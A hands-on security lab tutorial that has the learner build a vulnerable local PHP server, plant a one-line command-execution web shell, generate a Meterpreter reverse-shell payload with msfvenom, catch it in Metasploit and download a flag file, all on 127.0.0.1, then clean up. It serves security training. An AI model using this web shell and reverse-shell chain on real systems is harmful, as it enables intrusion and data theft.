# Lab: Perform a Web Application Attack

**Estimated time:** 30 minutes

## Overview

This lab simulates a common web application attack scenario. You will set up a local PHP server that mimics a vulnerable application, upload a malicious payload via a file upload flaw, and retrieve a simulated flag file. The goal is to understand how attackers exploit web vulnerabilities and how defenders can detect and prevent such behavior.

## Learning Objectives

By completing this lab, you will be able to:

* Simulate and fingerprint a web application
* Exploit a simulated file upload vulnerability
* Establish a reverse Meterpreter shell
* Extract a sensitive target file from the server

---

## Exercise 1: Prepare the Vulnerable Web Server

This exercise sets up a vulnerable web server running under a non-privileged user, mirroring common real-world configurations.

### Step 1.1: Create the Victim User and Web Directory

Open a terminal and run:

```bash
sudo adduser victim --disabled-password --gecos ""
sudo mkdir -p /home/victim/web/uploads
sudo chown -R victim:victim /home/victim/web
```

**Why this matters:**

Attackers rarely gain root access immediately. Services often run under restricted accounts, and this setup mirrors that reality.

### Step 1.2: Set Up a Vulnerable File Upload and Flag

```bash
echo '<?php system($_GET["cmd"]); ?>' | sudo tee /home/victim/web/uploads/upload.php
echo "FLAG{simulated_web_flag}" | sudo tee /home/victim/web/uploads/flag.txt
sudo chown -R victim:victim /home/victim/web/uploads
```

**Why this matters:**

Uploadable PHP shells are a common exploitation vector. This creates a basic foothold and a target file.

### Step 1.3: Start a Fake PHP Web Server

```bash
sudo apt update
sudo apt install php
sudo -u victim php -S 127.0.0.1:8080 -t /home/victim/web/uploads &
```

**Why this matters:**

This launches a simple local web server under a non-root user, reducing the risk of system-wide damage.

---

## Exercise 2: Create and Deploy a Reverse Shell

This exercise generates and plants a malicious payload that connects back to the attacker.

### Step 2.1: Generate the Payload Using msfvenom

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o shell.php
```

Move the payload into the upload directory:

```bash
sudo cp shell.php /home/victim/web/uploads/
sudo chown victim:victim /home/victim/web/uploads/shell.php
```

**Why this matters:**

This models how attackers abuse file upload flaws to place reverse shell payloads on target systems.

---

## Exercise 3: Trigger the Payload and Gain Access

This exercise uses Metasploit to receive the reverse connection.

### Step 3.1: Set Up the Metasploit Listener

In a Metasploit terminal:

```text
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
```

In a second terminal, trigger the payload:

```bash
curl http://127.0.0.1:8080/shell.php
```

Back in Metasploit:

```text
background
sessions
```

**Why this matters:**

Reverse shells provide attackers with interactive control after a successful upload exploit.

---

## Exercise 4: Enumerate the Host and Extract the Flag

### Step 4.1: Access the Shell and Retrieve Data

In Metasploit:

```text
sessions -i 1
sysinfo
getuid
```

List files and download the flag:

```text
cd /home/victim/web/uploads
download flag.txt
```

**Why this matters:**

This simulates data exfiltration, representing the theft of sensitive files such as credentials or intellectual property.

---

## Exercise 5: Clean Up the Environment

Cleanup reinforces responsible lab usage and mirrors post-compromise cleanup behavior.

### Step 5.1: Remove the Payload and Shut Down the Server

```bash
sudo rm /home/victim/web/uploads/shell.php
sudo pkill -u victim php
```

### Step 5.2: Delete the Victim User and Directories

```bash
sudo deluser --remove-home victim
```

**Why this matters:**

Removing artifacts prevents accidental reuse of vulnerable components and restores the system to a clean state.
